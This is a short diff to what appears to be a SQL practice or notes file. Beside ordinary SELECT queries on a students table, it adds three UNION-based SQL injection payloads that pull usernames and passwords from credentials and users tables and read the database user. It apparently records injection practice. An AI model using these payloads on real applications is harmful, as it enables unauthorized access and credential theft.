@@ -9,6 +9,12 @@ SELECT * FROM students LIMIT 10;
 SELECT * FROM students WHERE student_id = 1;
 SELECT * FROM ten_bang WHERE name LIKE 'Bar%';
 
+cn' UNION select 1, username, password, 4 from dev.credentials-- -
+cn' UNION select 1, user(),3,4 from dev.credentials-- -
+cn' UNION select 1, username, password, 4 from users-- -
+
+
+
 
 
 
